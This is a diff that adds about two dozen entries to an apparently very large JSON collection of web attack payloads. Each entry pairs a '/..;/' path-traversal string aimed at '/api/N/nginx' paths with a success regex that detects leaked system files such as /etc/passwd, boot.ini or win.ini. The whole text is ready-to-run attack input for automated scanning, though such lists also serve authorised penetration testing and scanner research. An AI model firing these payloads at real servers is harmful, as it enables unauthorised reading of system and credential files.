@@ -267276,5 +267276,280 @@
       "expected_status_code": 200,
       "success_regex": "root:|boot\\.ini|\\[extensions\\]"
     }
+  },
+  {
+    "payload_id": "OWP-474549",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/..;/..;/..;/..;/..;/api/1/nginx",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-474550",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/..;/..;/..;/..;/..;/api/2/nginx",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-474551",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/..;/..;/..;/..;/..;/api/3/nginx",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-474552",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/..;/..;/..;/..;/..;/api/5/nginx",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-474553",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/..;/..;/..;/..;/..;/api/9/nginx",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-474554",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/..;/..;/..;/..;/api/1/nginx",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-474555",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/..;/..;/..;/..;/api/2/nginx",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-474556",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/..;/..;/..;/..;/api/3/nginx",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-474557",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/..;/..;/..;/..;/api/5/nginx",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-474558",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/..;/..;/..;/..;/api/9/nginx",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-474559",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/..;/..;/..;/api/1/nginx",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-474560",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/..;/..;/..;/api/2/nginx",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-474561",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/..;/..;/..;/api/3/nginx",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-474562",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/..;/..;/..;/api/5/nginx",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-474563",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/..;/..;/..;/api/9/nginx",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-474564",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/..;/..;/api/1/nginx",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-474565",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/..;/..;/api/2/nginx",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-474566",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/..;/..;/api/3/nginx",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-474567",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/..;/..;/api/5/nginx",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-474568",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/..;/..;/api/9/nginx",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-474569",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/..;/api/1/nginx",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-474570",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/..;/api/2/nginx",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-474571",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/..;/api/3/nginx",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-474572",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/..;/api/5/nginx",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-474573",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/..;/api/9/nginx",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
   }
 ]
